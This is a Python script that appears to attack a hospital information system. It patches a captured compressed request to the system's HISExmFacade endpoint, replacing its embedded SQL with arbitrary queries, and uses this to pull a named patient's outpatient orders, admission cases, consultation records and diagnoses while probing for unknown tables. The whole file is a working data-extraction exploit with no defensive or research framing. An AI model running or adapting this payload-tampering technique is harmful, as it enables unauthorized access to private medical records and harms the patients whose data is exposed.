from his_client_final import HISClient
import sys, re

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()

def execute_sql(sql_query):
    import zlib, os, requests
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=zlib.compress(patched_payload), headers=c.headers)
    if resp.status_code == 200:
        return zlib.decompress(resp.content).decode('utf-8', errors='ignore')
    return None

def parse_rows(text, tag="DRMODIFY"):
    if not text: return []
    rows = re.findall(f'<{tag}[^>]*>(.*?)</{tag}>', text, re.DOTALL)
    out = []
    for r in rows:
        fields = re.findall(r'<(\w+)>(.*?)</\1>', r)
        out.append({k: v for k, v in fields})
    return out

target = "003380272B"

# 1. Distinct OrTypes in OPDORDM
print("[*] Distinct OrTypes in OPDORDM:")
q_otypes = f"SELECT DISTINCT ORTYPE FROM OPDUSR.OPDORDM WHERE HHISNUM = '{target}'"
res_otypes = execute_sql(q_otypes)
rows_otypes = parse_rows(res_otypes)
for r in rows_otypes:
    print(f"  Type: {r.get('ORTYPE')}")

# 2. Check for Consultations in OPDORDM
print("\n[*] Specifically checking for Consultations in OPDORDM...")
q_cons = f"SELECT * FROM OPDUSR.OPDORDM WHERE HHISNUM = '{target}' AND (PFNM LIKE '%會診%' OR ORTYPE IN ('CONS', 'CSL', 'CS')) AND ROWNUM <= 10"
res_cons = execute_sql(q_cons)
rows_cons = parse_rows(res_cons)
if rows_cons:
    print(f"  [+] Found {len(rows_cons)} potential consultation records.")
    for r in rows_cons:
        print(f"    - {r.get('PFNM')} ({r.get('ORTYPE')})")
else:
    print("  [-] No consultation-like records found in OPDORDM.")

# 3. Find unique OPDCASENO in OPDORDM and check if they are in PAT_ADM_CASE
print("\n[*] Analyzing OPDCASENO mapping to PAT_ADM_CASE...")
q_all_o = f"SELECT DISTINCT OPDCASENO FROM OPDUSR.OPDORDM WHERE HHISNUM = '{target}'"
res_all_o = execute_sql(q_all_o)
rows_all_o = parse_rows(res_all_o)
opd_casenos = [r.get('OPDCASENO') for r in rows_all_o if r.get('OPDCASENO')]

q_all_a = f"SELECT HCASENO FROM SYSTEM.PAT_ADM_CASE WHERE HHISNUM = '{target}'"
res_all_a = execute_sql(q_all_a)
rows_all_a = parse_rows(res_all_a)
adm_casenos = [r.get('HCASENO') for r in rows_all_a if r.get('HCASENO')]

print(f"  OPDCASENO count: {len(opd_casenos)}")
print(f"  PAT_ADM_CASE HCASENO count: {len(adm_casenos)}")

non_adm_cases = [c for c in opd_casenos if c not in adm_casenos]
print(f"  Non-Admission Cases found: {len(non_adm_cases)}")
if non_adm_cases:
    print(f"  [+] Sample Non-Admission Case: {non_adm_cases[0]}")
    # Get details for this case
    q_det = f"SELECT * FROM OPDUSR.OPDORDM WHERE OPDCASENO = '{non_adm_cases[0]}' AND ROWNUM <= 5"
    res_det = execute_sql(q_det)
    rows_det = parse_rows(res_det)
    for r in rows_det:
        print(f"    - Order: {r.get('PFNM')} ({r.get('ORTYPE')}) @ {r.get('BEGINDATETIME')}")

# 4. Probe for OPD Visit Table again with a very specific name
# If it's a non-adm case, what table stores its diagnosis?
# Maybe OPDUSR.OPD_PAT_CASE?
if non_adm_cases:
    p = 'OPDUSR.OPD_CASE'
    print(f"[*] Probing {p} for Case {non_adm_cases[0]}...")
    try:
        res = execute_sql(f"SELECT * FROM {p} WHERE OPDCASENO = '{non_adm_cases[0]}'")
        if res and '<NewDataSet>' in res:
             rows = parse_rows(res)
             if rows:
                 print(f"  [+] SUCCESS: {p} has details. Keys: {rows[0].keys()}")
                 print(f"  [+] Diagnosis? {rows[0].get('DIAGNOSIS')}")
    except: pass
